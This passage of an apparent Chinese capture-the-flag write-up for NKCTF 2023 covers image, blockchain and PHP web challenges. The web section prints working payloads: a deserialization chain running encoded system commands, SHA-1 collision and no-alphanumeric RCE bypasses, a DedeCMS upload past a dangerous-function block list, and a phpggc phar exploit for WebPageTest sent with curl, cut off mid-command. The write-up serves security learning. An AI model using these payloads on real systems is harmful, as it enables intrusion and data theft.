src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-6.png"></p><p>python提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到<code>flag2 is here: images_are_fun_</code></p><p>三段flag拼接起来<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p><h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p><p>查看合约代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p><p>在<code>metamask</code>中链接题目给的私链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png"></p><p>使用<code>remix ide</code></p><p>编译后指定题目部署的地址</p><p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png"></p><p>在Metamask确认交易请求</p><p>等待交易打包，确认上链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png"></p><h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png"></p><p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p><p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p><p>列目录：<code>dir /</code></p><p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png"></p><p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png"></p><h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p><p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p><p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p><p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p><p>左侧核心栏中有个文件式管理器，可以上传文件</p><p>存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>scandir</code>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>include</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png"></p><h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetest反序列化</p><p><a href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p><p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d 